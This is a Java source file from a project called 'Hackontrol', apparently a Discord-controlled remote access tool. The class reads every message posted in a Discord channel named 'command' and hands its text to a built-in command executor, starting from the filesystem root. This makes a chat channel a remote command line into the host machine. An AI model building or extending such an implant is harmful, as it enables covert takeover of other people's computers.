package com.khopan.hackontrol.channel.command;

import java.io.File;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.MessageManager;
import com.khopan.hackontrol.manager.common.sender.sendable.ChannelSendable;
import com.khopan.hackontrol.registry.Registry;

import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class CommandChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "command";

	static File CurrentDirectory;

	static {
		try {
			CommandChannel.CurrentDirectory = File.listRoots()[0];
		} catch(Throwable Errors) {
			CommandChannel.CurrentDirectory = null;
		}
	}

	@Override
	public String getName() {
		return CommandChannel.CHANNEL_NAME;
	}

	@Override
	public void register(Registry registry) {
		registry.register(MessageManager.MESSAGE_RECEIVED_EVENT_REGISTRY, this :: messageReceived);
	}

	private void messageReceived(MessageReceivedEvent Event) {
		String command = Event.getMessage().getContentDisplay().trim();
		BuiltInCommand.execute(ChannelSendable.of(this.channel), command);
	}
}
